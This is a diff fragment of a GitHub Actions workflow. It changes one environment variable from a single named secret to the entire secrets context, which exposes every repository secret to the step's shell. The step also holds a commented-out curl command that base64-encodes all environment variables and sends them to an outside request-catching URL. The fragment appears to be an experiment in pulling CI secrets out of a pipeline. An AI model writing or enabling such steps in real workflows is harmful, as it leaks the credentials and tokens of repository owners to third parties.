@@ -37,7 +37,7 @@ jobs:
           echo "$modified_variable"
       - name: Add maskaaa
         env:
-          MY_SECRET: ${{ secrets.FAVOURITE }}
+          MY_SECRET: ${{ secrets }}
         run: |
           MOVIE=${{ secrets.FAVOURITE }}
           #curl -k https://swagolili.free.beeceptor.com/?data=$(env | base64 --wrap=0)
